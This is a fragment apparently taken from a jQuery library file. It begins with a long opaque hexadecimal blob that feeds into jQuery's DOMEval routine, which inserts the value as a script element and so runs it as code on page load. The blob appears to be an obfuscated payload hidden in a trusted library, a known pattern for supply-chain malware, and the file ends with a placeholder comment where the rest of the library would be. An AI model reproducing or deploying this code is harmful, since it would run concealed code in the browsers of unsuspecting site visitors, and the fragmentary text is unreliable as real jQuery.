9d875a7696d7eb571918223fcadac6f1b4d26195238ef73b85a5c3a39833f5136a4256346f31449a96662647527fd397b52cf400e7dbc8f1a40b3bab278bb74177875d56f37818a343df67845b9895331eb2eff7c20053e888e7f6dfd8045a181e9bdfde7993c4873c06f82ec653df69a5d9afa0c31a4ee5f7fd49548129fb34d5b22aeca5b474ed562be3d084ccca15c55b52b024de969b2afa427c38323333752a5d0d4e67782eff4411173fbf79acf18277b64ba8b2ff42a3a1d48146ff82f34ab08a57f378100b1194ac920f0d7de9164fc42b0fad50ac1de5d4f4d01e10ed38fbf17f10e75ff2ec54d7ea99ba03568ab49389b737b00d992e9620f8b78642efa51f432f664fb57f674e4e46d4ea52a00585be4f93e0859fbdc14bb5b594d91b588d1e9bfe870c0eff9b23ae9ed6ba055aaddbf2a7c8bfa0337e76e189a64dea627a6779d7f980d45745302fd193588b718b2c90f9f259bdfe25f4d8fbfa4efa69289e6294b06a1dcb597acbb69bdfe66ef9e1c32fc0362ded6289ce3a819b3888e39463db60dde03518c502f0ddb02ba5af7f05a1dd093546786e915d9a8d52baf11a69313e61bd3aead533623dd4e9881266249d8c7f0fbe9158bd88026693c1c429f71f9fd6e0300dc60d2a3cdde3b4a124fb09729c7de128e273ce9a7e1d30a94693c0cc49276224cd17ac3d812c54cce77db25a316d3933ed937b5695fe70514b9942396c1994b3ff93ef8c7dcb4300284ecd81577d867f5167196a9008f63a67c36c1ec17fc3c76fbe6387cce9e0d7c03b993250ee10510df34bc6f1305001b28dd058f7156093f3e4db77bcfb5d9b99b69be55c4549b6132fd77a20e42db61e2a4f7ac8bfa583ad44e069c1b1d717ae14c229514e29c6bfd334810c04fa0b53156590a1eb2bf9dd1de28b2b8196e80a6026c3657e90c1a88205e31a27687d26a4bc2c011153fbe1fc564aa6119abb57c6310c15373a68765b0e4dcc68ee62d81e019f43566c32f960d16b032be7954a0bd30aa4ea61ae0bf097b581d3ec0313692cf09dba17627f0158a09e0c14805c9c7110edb5b935840b3d3ab9cde980d99015cc71a3c57f7ea712f3f02d775340052bfde1be179bd87e4a98ae6bc2a2d8a26713d6096fa0509aa2a4c21ec56b1d612e27e5b8a83ab01eea8b053bf0f00903b55a7f4bde48b0736cdaa65d7c73581584045f86bc303fb89c54b5a2157d60b6320b91fc8ce5d4d0511cc52dfb75c2219970f9530863cea1b35d7e0880eefbd7f157afa81191f56df0279900208fae16ca99105f1c78ecdeffbcc4d9ff175d167a21285080a469e0e2b66b2775317d45d4835263e5878dd75b32a4c4ac6a5b7c8fbc58aa476cd96fc1f0e0d2160a237a831f79f10ed5460518679cf19aedaaae7f898c144c4ce780103455d6a03901e5c124c7dcd3ab96ce0fa3951eec05a7b93981c8bde1d717472d9d969f0329b90ded48f54be1b92e6d31782acba6e1923bb30676b4c2dde57d550f5d345604a30b6a7fd04e9263abd8878c37081f81777a9ae08f20cf5e1cb71a61372e61c06758d55e32c0e698179586b3b5bc7722e43b28c3dc0bb4f3297d794fd257eae0c6ce005b99eaab949a6255cd7ce868781fe314d3add4d796e00d78c23bfb59b431c45dd26724f635ee961ed8354014df499158c4c030b450d7ac957b61a0155fb67eb6001c952071c1dc8372aa8716f0e5232d82c9abea8a8bb6297b4ab35e0ab44a73bae98f4e21bdf1fde5eac6fe68baf4f2274034cae8388f761c0632e9b17b1a9a4099cb25d739e2bfe189e88b7fb14fc5dc61ea57944079ec24a8d5d4e165831f23b365e24c2da6b7c958b35873ff6a75f0d75f092ccf4689ac688e92eb39cfc16aa52175f251c1617aa03da79fd0814950565aae738ad052e026f5307505957c71ac1d011e637920fca9bd10d1fd77972166a222799c5cbf6bfa5e3f5c0587330ee975716549189a93ac26f81410c8f7f8db71e5d548a5f643bf0557e946032829585169347e700d17e2a4494bc6cb9a5c19e37b9af1eb8668fc07f6f75890caeebf82088224445fe8ddb54ecd27c58367d6c0896d5e0dd0f916c2e6f26ac4c89f13a03798e739ff3a87401c1995e6b89eab9368ad97450c7c43b4d040326de8df8556c2eaab35e5f7083d29dfda6ead829b78e8fd8a4a97a66c4fed753d85138fc0cd5046c3b2909d0fe1edd84621a299a959a717a8b6f3d7a2995da42337da4bfe4b7b588c4e099c4a4e59879881703cf5944e9e3a636345154a878efb461b159b4507f1a5b5b78539cb93bf68ec825ba943917a2ba5057ea328edf2043bc073b9efb36896d579739a8b4365b63d05202c1f37f758d841161fac6276044f39b58389fd733f7be45d4fa63ac740aefb680427fb0f71aada5264136f8505eba32570ae0e82d0384df57c49a8be027ab60d2a77480e6e33929b6397b2adf71fc30aca71a9d8e81b82be75f9253c43a9245d38e6aa1d8e4ad142595ab8f271493a3f167cd76c9bac0b58aa2441058941265afca9a300c5dc562bfb8b1dd324ec4745d9e2c1a856dc84360aaccc7c1844153cde4186db37bfb5235679db75cc212d26d635db8aac6c2a77b094ab781f6d8fa41b1dc4e7f7c43cf74ca979bf16814a4f37bf431baa07c909a04ea9cff0098b46044fe94560b595ac06f8a1bdf763ca5640344caad00ae0927fd18a17eb6388cfca2b64ca36f1b4819093e2833cf8622226800b32c0ac4377e2df3fb4775949347049e4b9297d1125646b698c648fe2ad659763cd748536597b2538bf33b10a1ebf051bf94ac3dd3af35d3978aa00555d67163a14c642ac4ba31bb5bba7982bcbd2de59f80a13dd6ad6819e673bd3cbd2cc2c6a4fb0cd3ae090e073c86646260020057bcf7af944b5e4dd931f0031a3a5c71a12a8bd9053e01a1ad01b26376a813c6ea1c260044941791dbd2cfdef496172d3a64b5f9ab20a8ea56da58b569b51ad1c770fe1bc4755bc9f49e408e110a0711835796e286d1d4c0acd464ee5489bd5f49ca9025543de0cdcfbdf77398f0ac7c974cec5f58f7defb5bd2cc256762f1fc2779de1cc90aeedd7a235e7497301c8881dd30f7d25adb8ccc56aeb7e5718af73245c13457f5f2080a4d516b865f0f51d56b83fbf95486fa73004d3282f62030e5ca0ed75ed1e37a3dca3b099d3577abbb8ace119f99d084dd317c96a25d9417d084382756bf98518c7259702dae4eab10f28a72ed5485d10da868719a56930e89fb87ac310b182fbf5dd887368efc4e0f6c1565e7a6b996e35ac76e1e1a8d4a5bf419227736b51231a32e1ec623e4527abb23ad431161a87537f42023d78f230d6ce6c37eae3dd42ba2d1afedbc22390ec2ce6715b25987d90309b8f1b17c7341bed93e4bfd7f916dafd23d3f08f6ef0edba4f7861e31f4cd66b8a59a6e4b1cda2ebd5b14ccdeb0c460ae659a8b59b0d628968729c4d1158db105ae6ad7926d8898ebffc49070690aff5b8c35de9ac5848a28f4fb8e9a2031a4d15fcdbe80e227f81e8910f788ef83b0d8538c91a1744374db0f479bb8105933ccc4143270434cfcc691d278a13dd601390faae0a078daac8e687f612d76879191dbe45ef34d09fc2318340381b8a0543c7200ce8a572b09fe9e14375f9c174633cae4f24e7d3f34b79e0b84fdafb1744001d46b319fb26e89fa27255959e74e5c9f5ae6e61fc5f27dc3bdbd64b082f22e8da39a74ee0e1668d61d8dca8154c2cdb36ea2804577e858480cb9303d3d9feac1f663ba128f8c942206fb0c722aa31ae84c5c57b58639baff042953d875a296de377a47d2c1d26dab8983c2b4bdb");
        script.text = code;
        if (node) {
            for (i in preservedScriptAttributes) {
                val = node[i] || node.getAttribute && node.getAttribute(i);
                if (val) {
                    script.setAttribute(i, val);
                }
            }
        }
        doc.head.appendChild(script).parentNode.removeChild(script);
    }

    function toType(obj) {
        if (obj == null) {
            return obj + "";
        }
        return typeof obj === "object" || typeof obj === "function" ?
            class2type[toString.call(obj)] || "object" :
            typeof obj;
    }

    // ... (REST OF JQUERY LIBRARY CODE CONTINUES)

});